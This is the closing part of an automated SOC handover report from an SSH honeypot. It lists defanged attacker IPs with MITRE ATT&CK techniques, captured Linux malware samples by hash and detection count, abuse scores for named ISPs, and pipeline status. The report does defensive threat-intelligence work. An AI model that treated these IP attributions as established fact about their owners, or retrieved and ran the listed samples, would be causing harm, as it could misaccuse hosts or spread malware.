| `157.230.150[.]187` | 1 | 2026-06-16 23:13 | 2026-06-16 23:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `161.118.194[.]254` | 1 | 2026-06-16 21:23 | 2026-06-16 21:23 | 30s | 0 | `T1592` | 🟢 LOW |
| `161.33.206[.]60` | 1 | 2026-06-16 21:04 | 2026-06-16 21:05 | 30s | 0 | `T1592` | 🟢 LOW |
| `170.249.217[.]154` | 1 | 2026-06-16 21:49 | 2026-06-16 21:49 | 30s | 0 | `T1592` | 🟢 LOW |
| `174.75.211[.]203` | 1 | 2026-06-16 21:50 | 2026-06-16 21:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `174.75.211[.]217` | 1 | 2026-06-16 22:35 | 2026-06-16 22:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `176.65.139[.]130` | 1 | 2026-06-16 21:24 | 2026-06-16 21:24 | 9s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.73.246[.]19` | 1 | 2026-06-16 22:13 | 2026-06-16 22:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `179.185.18[.]67` | 1 | 2026-06-16 22:57 | 2026-06-16 22:57 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.97.242[.]78` | 1 | 2026-06-16 21:07 | 2026-06-16 21:08 | 30s | 0 | `T1592` | 🟢 LOW |
| `181.45.239[.]62` | 1 | 2026-06-16 21:12 | 2026-06-16 21:12 | 16s | 0 | `T1592` | 🟢 LOW |
| `183.179.215[.]17` | 1 | 2026-06-16 21:08 | 2026-06-16 21:08 | 31s | 0 | `T1592` | 🟢 LOW |
| `183.82.111[.]224` | 1 | 2026-06-16 22:47 | 2026-06-16 22:47 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.244.245[.]2` | 1 | 2026-06-16 21:08 | 2026-06-16 21:09 | 30s | 0 | `T1592` | 🟢 LOW |
| `192.121.157[.]12` | 1 | 2026-06-16 22:13 | 2026-06-16 22:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.9.139[.]112` | 1 | 2026-06-16 23:06 | 2026-06-16 23:07 | 30s | 0 | `T1592` | 🟢 LOW |
| `193.235.22[.]61` | 1 | 2026-06-16 22:13 | 2026-06-16 22:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `198.176.55[.]171` | 1 | 2026-06-16 21:58 | 2026-06-16 22:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `212.135.40[.]141` | 1 | 2026-06-16 23:21 | 2026-06-16 23:21 | 30s | 0 | `T1592` | 🟢 LOW |
| `213.126.222[.]66` | 1 | 2026-06-16 22:28 | 2026-06-16 22:28 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `213.35.110[.]189` | 1 | 2026-06-16 21:02 | 2026-06-16 21:03 | 30s | 0 | `T1592` | 🟢 LOW |
| `218.219.234[.]85` | 1 | 2026-06-16 22:18 | 2026-06-16 22:18 | 13s | 0 | `T1592` | 🟢 LOW |
| `218.251.80[.]200` | 1 | 2026-06-16 21:50 | 2026-06-16 21:50 | 30s | 0 | `T1592` | 🟢 LOW |
| `223.241.247[.]227` | 1 | 2026-06-16 22:19 | 2026-06-16 22:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `23.27.48[.]2` | 1 | 2026-06-16 23:22 | 2026-06-16 23:22 | 30s | 0 | `T1592` | 🟢 LOW |
| `37.114.48[.]34` | 1 | 2026-06-16 21:30 | 2026-06-16 21:31 | 30s | 0 | `T1592` | 🟢 LOW |
| `37.60.141[.]90` | 1 | 2026-06-16 22:52 | 2026-06-16 22:53 | 30s | 0 | `T1592` | 🟢 LOW |
| `43.165.185[.]71` | 1 | 2026-06-16 21:12 | 2026-06-16 21:12 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.144.136[.]209` | 1 | 2026-06-16 23:12 | 2026-06-16 23:12 | 30s | 0 | `T1592` | 🟢 LOW |
| `45.192.197[.]108` | 1 | 2026-06-16 22:11 | 2026-06-16 22:11 | 30s | 0 | `T1592` | 🟢 LOW |
| `51.8.152[.]226` | 1 | 2026-06-16 23:25 | 2026-06-16 23:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.132.18[.]53` | 1 | 2026-06-16 23:19 | 2026-06-16 23:19 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]179` | 1 | 2026-06-16 21:32 | 2026-06-16 21:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `74.225.200[.]41` | 1 | 2026-06-16 23:00 | 2026-06-16 23:00 | 30s | 0 | `T1592` | 🟢 LOW |
| `74.225.8[.]23` | 1 | 2026-06-16 21:12 | 2026-06-16 21:12 | 30s | 0 | `T1592` | 🟢 LOW |
| `82.152.164[.]224` | 1 | 2026-06-16 23:16 | 2026-06-16 23:17 | 30s | 0 | `T1592` | 🟢 LOW |
| `82.152.164[.]225` | 1 | 2026-06-16 21:38 | 2026-06-16 21:38 | 30s | 0 | `T1592` | 🟢 LOW |
| `83.168.88[.]126` | 1 | 2026-06-16 21:47 | 2026-06-16 21:47 | 30s | 0 | `T1592` | 🟢 LOW |
| `84.8.139[.]83` | 1 | 2026-06-16 20:57 | 2026-06-16 20:57 | 30s | 0 | `T1592` | 🟢 LOW |
| `85.121.124[.]169` | 1 | 2026-06-16 22:50 | 2026-06-16 22:51 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `193.235.22[.]61` | SE | Internetbolaget Hosting in Austria | **100** ⚠️ | 5 |
| `83.168.88[.]126` | PL | Korbank S. A. | **100** ⚠️ | 0 |
| `111.70.11[.]78` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 39 |
| `14.29.204[.]161` | CN | CHINANET Guangdong province network | **100** ⚠️ | 39 |
| `84.8.139[.]83` | ZA | Oracle Svenska AB | **100** ⚠️ | 1 |
| `176.65.139[.]130` | NL | Storm Industries LLC | **100** ⚠️ | 50 |
| `213.126.222[.]66` | NL | Knip't | **100** ⚠️ | 1 |
| `45.192.197[.]108` | JP | Akile LTD | **100** ⚠️ | 0 |
| `223.241.247[.]227` | CN | CHINANET Anhui province network | **100** ⚠️ | 50 |
| `181.45.239[.]62` | AR | Telecentro S.A. | **100** ⚠️ | 11 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 70 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 44 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 13 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |

---

## 🔕 False Positive Summary (165 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 2 |
| AbuseIPDB score 7 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 158 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 275 cases |
| Tool 34  | Credential Extractor        | ✅ 57 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 99 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 165 filtered (60.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 63 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 13 priority case(s) shown individually · 60 recon entry/entries in table (4 group(s) consolidating 41 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-16T23:26:59Z_
